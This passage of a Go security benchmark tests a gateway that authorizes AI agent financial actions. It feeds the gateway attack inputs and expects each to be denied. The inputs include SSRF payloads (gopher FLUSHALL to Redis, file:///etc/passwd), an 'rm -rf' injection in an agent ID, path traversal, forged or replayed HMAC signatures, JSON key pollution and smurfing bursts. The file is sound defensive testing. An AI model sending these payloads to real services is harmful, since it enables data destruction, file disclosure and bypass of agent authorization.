			ID: "SSRF-12", Category: "SSRF & Metadata Protection", Description: "Internal infrastructure domain cloak (.internal TLD)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"webhook": "http://backend.internal/debug"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-13", Category: "SSRF & Metadata Protection", Description: "Dangerous Gopher protocol scheme (gopher://)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"callback": "gopher://127.0.0.1:6379/_FLUSHALL"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-14", Category: "SSRF & Metadata Protection", Description: "Dangerous File URL protocol scheme (file:///etc/passwd)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"callback": "file:///etc/passwd"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "SSRF-15", Category: "SSRF & Metadata Protection", Description: "Dangerous Dict protocol scheme (dict://)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"callback": "dict://127.0.0.1:11211/stat"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 8: Cryptographic KYA Identity, Signature & Replay Attacks (12 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "KYA-01", Category: "Cryptographic Identity & KYA", Description: "Forged HMAC signature with wrong secret key",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "FORGED_SIG",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-02", Category: "Cryptographic Identity & KYA", Description: "Replay attack with consumed nonce",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "REPLAY",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-03", Category: "Cryptographic Identity & KYA", Description: "Stale timestamp outside permitted drift (10 minutes in past)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "STALE_TS",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-04", Category: "Cryptographic Identity & KYA", Description: "Future timestamp outside permitted drift (10 minutes in future)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "FUTURE_TS",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-05", Category: "Cryptographic Identity & KYA", Description: "Insufficient nonce entropy (<16 characters)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "SHORT_NONCE",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-06", Category: "Cryptographic Identity & KYA", Description: "Delimiter injection in claimed Agent ID (pipe character |)",
			AgentID: "ag_Travel|Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "PIPE_AGENT",
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-07", Category: "Cryptographic Identity & KYA", Description: "Agent ID header/body mismatch (Header: ag_Fraud_Bot, Body: ag_Travel_Bot)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "HEADER_MISMATCH",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-08", Category: "Cryptographic Identity & KYA", Description: "Incomplete authentication headers (Signature present, Nonce missing)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "MISSING_HEADER",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-09", Category: "Cryptographic Identity & KYA", Description: "Malformed non-RFC3339 timestamp (Unix epoch integer)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "MALFORMED_TS",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-10", Category: "Cryptographic Identity & KYA", Description: "Unauthenticated unsigned request in strict security mode",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "UNAUTHENTICATED_STRICT",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-11", Category: "Cryptographic Identity & KYA", Description: "Delimiter injection in Nonce field (pipe character |)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "PIPE_NONCE",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},
		{
			ID: "KYA-12", Category: "Cryptographic Identity & KYA", Description: "Tampered request body with original valid signature",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			AuthOverride: "TAMPER_BODY",
			ExpectedStatus: http.StatusUnauthorized, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 9: HTTP Parameter Pollution & RFC 8259 Structural (10 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "HPP-01", Category: "JSON Structure & HPP", Description: "Duplicate JSON keys at root level (RFC 8259 violation)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			RawJSONOverride: `{"agent_id":"ag_Travel_Bot","agent_id":"ag_Fraud_Bot","action":"TRANSFER","payload":{"amount":10}}`,
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-02", Category: "JSON Structure & HPP", Description: "Duplicate amount keys in payload ($1,000,000 vs $50)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			RawJSONOverride: `{"agent_id":"ag_Travel_Bot","action":"TRANSFER","payload":{"transfer_amount":1000000,"transfer_amount":50}}`,
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-03", Category: "JSON Structure & HPP", Description: "Duplicate nested keys inside metadata object",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			RawJSONOverride: `{"agent_id":"ag_Travel_Bot","action":"Issue_Refund","payload":{"meta":{"code":"A","code":"B"}}}`,
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-04", Category: "JSON Structure & HPP", Description: "Deeply nested JSON object recursion bomb (> 16 levels)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{
				"amount": 50.0,
				"l1": map[string]interface{}{"l2": map[string]interface{}{"l3": map[string]interface{}{"l4": map[string]interface{}{
					"l5": map[string]interface{}{"l6": map[string]interface{}{"l7": map[string]interface{}{"l8": map[string]interface{}{
						"l9": map[string]interface{}{"l10": map[string]interface{}{"l11": map[string]interface{}{"l12": map[string]interface{}{
							"l13": map[string]interface{}{"l14": map[string]interface{}{"l15": map[string]interface{}{"l16": map[string]interface{}{
								"l17": "overflow",
							}}}}}}}}}}}}}}}},
			},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-05", Category: "JSON Structure & HPP", Description: "Malformed unclosed JSON payload",
			RawJSONOverride: `{"agent_id":"ag_Travel_Bot","action":"Issue_Refund"`,
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-06", Category: "JSON Structure & HPP", Description: "Illegal agent_id format containing shell metacharacters (ag;rm -rf)",
			AgentID: "ag;rm -rf", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-07", Category: "JSON Structure & HPP", Description: "Illegal agent_id containing spaces and brackets ([admin])",
			AgentID: "[admin user]", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-08", Category: "JSON Structure & HPP", Description: "Excessively long agent_id identifier (> 64 characters)",
			AgentID: strings.Repeat("A", 65), Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-09", Category: "JSON Structure & HPP", Description: "Illegal action format containing path traversal (../../action)",
			AgentID: "ag_Travel_Bot", Action: "../../action",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},
		{
			ID: "HPP-10", Category: "JSON Structure & HPP", Description: "Empty JSON request object ({})",
			RawJSONOverride: `{}`,
			ExpectedStatus: http.StatusBadRequest, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 10: Casbin RBAC Zero-Trust Enforcement (8 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "RBAC-01", Category: "Role-Based Access Control", Description: "Fraud Bot unauthorized refund attempt (Only Lock_Card permitted)",
			AgentID: "ag_Fraud_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-02", Category: "Role-Based Access Control", Description: "Fraud Bot unauthorized funds transfer attempt",
			AgentID: "ag_Fraud_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-03", Category: "Role-Based Access Control", Description: "Travel Bot unauthorized credit line increase (Dispute AI only)",
			AgentID: "ag_Travel_Bot", Action: "Credit_Increase",
			Payload: map[string]interface{}{"amount": 1000.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-04", Category: "Role-Based Access Control", Description: "Travel Bot unauthorized tool execution (EXEC_TOOL)",
			AgentID: "ag_Travel_Bot", Action: "EXEC_TOOL",
			Payload: map[string]interface{}{"cmd": "echo test"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-05", Category: "Role-Based Access Control", Description: "Unknown rogue agent ID attempting action (ag_Rogue_Bot)",
			AgentID: "ag_Rogue_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 50.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-06", Category: "Role-Based Access Control", Description: "Dispute AI attempting unauthorized card lock (Fraud Bot only)",
			AgentID: "ag_Dispute_AI", Action: "Lock_Card",
			Payload: map[string]interface{}{"card_id": "card_123"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-07", Category: "Role-Based Access Control", Description: "Travel Bot attempting card unlock action (undeclared action)",
			AgentID: "ag_Travel_Bot", Action: "Unlock_Card",
			Payload: map[string]interface{}{"card_id": "card_123"},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "RBAC-08", Category: "Role-Based Access Control", Description: "Fraud Bot attempting credit increase",
			AgentID: "ag_Fraud_Bot", Action: "Credit_Increase",
			Payload: map[string]interface{}{"amount": 500.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},

		// ---------------------------------------------------------------------
		// CATEGORY 11: AML Sliding-Window Velocity & Anti-Smurfing (6 Scenarios)
		// ---------------------------------------------------------------------
		{
			ID: "AML-01", Category: "AML Velocity & Structuring", Description: "Single transaction exceeding maximum refund ceiling ($15,000 > $10,000)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 15000.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "AML-02", Category: "AML Velocity & Structuring", Description: "Single transaction exceeding single transfer ceiling ($30,000 > $25,000)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"amount": 30000.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "AML-03", Category: "AML Velocity & Structuring", Description: "Single transaction exceeding credit increase cap ($75,000 > $50,000)",
			AgentID: "ag_Dispute_AI", Action: "Credit_Increase",
			Payload: map[string]interface{}{"amount": 75000.0},
			ExpectedStatus: http.StatusForbidden, ExpectedDecision: "DENY",
		},
		{
			ID: "AML-04", Category: "AML Velocity & Structuring", Description: "Rapid burst smurfing transactions exceeding hourly ceiling ($9,900 x 3 = $29,700 > $25,000)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 9900.0},
			BurstReps: 3,
			ExpectedStatus: http.StatusTooManyRequests, ExpectedDecision: "DENY",
		},
		{
			ID: "AML-05", Category: "AML Velocity & Structuring", Description: "Multi-currency smurfing burst in KWD (3,000 KWD x 3 ≈ $29,340 > $25,000)",
			AgentID: "ag_Travel_Bot", Action: "Issue_Refund",
			Payload: map[string]interface{}{"amount": 3000.0, "currency": "KWD"},
			BurstReps: 3,
			ExpectedStatus: http.StatusTooManyRequests, ExpectedDecision: "DENY",
		},
		{
			ID: "AML-06", Category: "AML Velocity & Structuring", Description: "Field alias smurfing burst (transfer_amount: 9,000 x 3 = $27,000 > $25,000)",
			AgentID: "ag_Travel_Bot", Action: "TRANSFER",
			Payload: map[string]interface{}{"transfer_amount": 9000.0},
			BurstReps: 3,
			ExpectedStatus: http.StatusTooManyRequests, ExpectedDecision: "DENY",
		},
	}

	totalScenarios := len(scenarios)
	passedAssertions := 0
	failedAssertions := 0

	falsePositives := 0 // Legitimate request wrongly blocked
	falseNegatives := 0 // Attack request wrongly allowed

	latencies := make([]time.Duration, 0, totalScenarios)
	categoryStats := make(map[string][2]int) // category -> [passed, total]

	for _, s := range scenarios {
		// Reset velocity tracker per test scenario (except within a burst) to ensure absolute isolation
		globalVelocityTracker.Reset()

		var rawJSON []byte
		if s.RawJSONOverride != "" {
			rawJSON = []byte(s.RawJSONOverride)
		} else {
			reqBody := AgentRequest{
				AgentID: s.AgentID,
				Action:  s.Action,
				Payload: s.Payload,
			}
			rawJSON, _ = json.Marshal(reqBody)
		}

		// Configure strict auth if scenario specifies
		originalStrict := strictAuthEnabled
		if s.AuthOverride == "UNAUTHENTICATED_STRICT" {
			strictAuthEnabled = true
		} else {
			strictAuthEnabled = false
		}

		// Handle burst repetition (for AML smurfing)
		reps := 1
		if s.BurstReps > 1 {
			reps = s.BurstReps
		}

		var lastStatus int
		var duration time.Duration

		for r := 0; r < reps; r++ {
			req := httptest.NewRequest(http.MethodPost, "/enforce", bytes.NewBuffer(rawJSON))
			req.Header.Set("Content-Type", "application/json")

			now := time.Now().UTC()
			ts := now.Format(time.RFC3339)
			nonce := fmt.Sprintf("century_nonce_%s_%d_%d", s.ID, r, now.UnixNano())
			headerAgentID := s.AgentID

			// Compute valid canonical signature
			bodyHash := sha256.Sum256(rawJSON)
			canonical := fmt.Sprintf("%s|%s|%s|%s", headerAgentID, ts, nonce, hex.EncodeToString(bodyHash[:]))
			mac := hmac.New(sha256.New, []byte(agentSharedSecret))
			mac.Write([]byte(canonical))
			sig := hex.EncodeToString(mac.Sum(nil))

			// Apply Auth Overrides
			switch s.AuthOverride {
			case "FORGED_SIG":
				badMac := hmac.New(sha256.New, []byte("wrong-attacker-secret-key-000000"))
				badMac.Write([]byte(canonical))
				sig = hex.EncodeToString(badMac.Sum(nil))
			case "STALE_TS":
				ts = now.Add(-10 * time.Minute).Format(time.RFC3339)
			case "FUTURE_TS":
				ts = now.Add(10 * time.Minute).Format(time.RFC3339)
			case "SHORT_NONCE":
				nonce = "short123"
			case "PIPE_AGENT":
				headerAgentID = "ag_Travel|Bot"
			case "PIPE_NONCE":
				nonce = "century_nonce|pipe|injection"
			case "HEADER_MISMATCH":
				headerAgentID = "ag_Fraud_Bot"
			case "MALFORMED_TS":
				ts = fmt.Sprintf("%d", now.Unix())
			case "TAMPER_BODY":
				// Tamper body after signature generation
				tamperedJSON := []byte(`{"agent_id":"ag_Travel_Bot","action":"Issue_Refund","payload":{"amount":1000000.0}}`)
				req = httptest.NewRequest(http.MethodPost, "/enforce", bytes.NewBuffer(tamperedJSON))
			case "REPLAY":
				// Pre-record nonce in cache to simulate replay
				nonceStore.CheckAndRecord(nonce, now)
			}

			if s.AuthOverride == "MISSING_HEADER" {
				// Provide Signature, Timestamp, AgentID, but omit Nonce (incomplete headers)
				req.Header.Set("X-Sentinel-Agent-ID", headerAgentID)
				req.Header.Set("X-Sentinel-Timestamp", ts)
				req.Header.Set("X-Sentinel-Signature", sig)
			} else if s.AuthOverride != "UNAUTHENTICATED_STRICT" {
				req.Header.Set("X-Sentinel-Agent-ID", headerAgentID)
				req.Header.Set("X-Sentinel-Timestamp", ts)
				req.Header.Set("X-Sentinel-Nonce", nonce)
				req.Header.Set("X-Sentinel-Signature", sig)
			}

			rr := httptest.NewRecorder()

			t0 := time.Now()
			enforceHandler(rr, req)
			duration = time.Since(t0)

			lastStatus = rr.Code
		}

		strictAuthEnabled = originalStrict
		latencies = append(latencies, duration)

		// Assertions and Metric Logging
		isPass := (lastStatus == s.ExpectedStatus)
		stats := categoryStats[s.Category]
		stats[1]++

		if isPass {
			passedAssertions++
			stats[0]++
			categoryStats[s.Category] = stats
			fmt.Printf("[PASS] %-10s | %-30s | Status: %d (Exp: %d) | %s (%6.2f µs)\n",
				s.ID, s.Category, lastStatus, s.ExpectedStatus, s.Description, float64(duration.Nanoseconds())/1000.0)
		} else {
			failedAssertions++
			categoryStats[s.Category] = stats
			fmt.Printf("[FAIL] %-10s | %-30s | Status: %d (Exp: %d) | %s\n",
				s.ID, s.Category, lastStatus, s.ExpectedStatus, s.Description)
			t.Errorf("[%s] Expected HTTP status %d, got %d", s.ID, s.ExpectedStatus, lastStatus)

			if s.ExpectedDecision == "ALLOW" && lastStatus != http.StatusOK {
				falsePositives++
			} else if s.ExpectedDecision == "DENY" && lastStatus == http.StatusOK {
				falseNegatives++
			}
		}
	}

	// Calculate Telemetry & Latency Percentiles
	sort.Slice(latencies, func(i, j int) bool {
		return latencies[i] < latencies[j]
	})

	var totalDuration time.Duration
	for _, l := range latencies {
		totalDuration += l
	}
	avgLatency := totalDuration / time.Duration(len(latencies))
	minLatency := latencies[0]
	maxLatency := latencies[len(latencies)-1]
	p50Latency := latencies[len(latencies)/2]
	p95Latency := latencies[int(float64(len(latencies))*0.95)]
	p99Latency := latencies[int(float64(len(latencies))*0.99)]

	accuracy := float64(passedAssertions) / float64(totalScenarios) * 100.0
	fpr := float64(falsePositives) / 15.0 * 100.0 // 15 benign workloads
	fnr := float64(falseNegatives) / float64(totalScenarios-15) * 100.0

	fmt.Println("\n------------------------------------------------------------------------")
	fmt.Println("             CENTURY BENCHMARK TELEMETRY & RESULTS SUMMARY              ")
	fmt.Println("------------------------------------------------------------------------")
	fmt.Printf("Total Evaluated Scenarios : %d\n", totalScenarios)
	fmt.Printf("Total Passed Assertions   : %d\n", passedAssertions)
	fmt.Printf("Total Failed Assertions   : %d\n", failedAssertions)
	fmt.Printf("Decision Accuracy         : %.2f%%\n", accuracy)
	fmt.Printf("False Positive Rate (FPR) : %.2f%% (%d legitimate actions blocked)\n", fpr, falsePositives)
	fmt.Printf("False Negative Rate (FNR) : %.2f%% (%d malicious attacks allowed)\n", fnr, falseNegatives)

	fmt.Println("\n--- LATENCY TELEMETRY ---")
	fmt.Printf("Min Latency               : %v\n", minLatency)
	fmt.Printf("Avg Latency               : %v\n", avgLatency)
	fmt.Printf("Median (p50) Latency      : %v\n", p50Latency)
	fmt.Printf("95th Percentile (p95)     : %v\n", p95Latency)
	fmt.Printf("99th Percentile (p99)     : %v\n", p99Latency)
	fmt.Printf("Max Latency               : %v\n", maxLatency)

	fmt.Println("\n--- BREAKDOWN BY CATEGORY ---")
	categories := make([]string, 0, len(categoryStats))
	for k := range categoryStats {
		categories = append(categories, k)
	}
	sort.Strings(categories)

	for _, cat := range categories {
		st := categoryStats[cat]
		pct := float64(st[0]) / float64(st[1]) * 100.0
		fmt.Printf("• %-32s: %2d/%2d passed (%5.1f%%)\n", cat, st[0], st[1], pct)
	}
	fmt.Println("========================================================================")

	if failedAssertions > 0 {
		t.Fatalf("Century Benchmark Suite FAILED: %d of %d scenarios failed", failedAssertions, totalScenarios)
	}
}
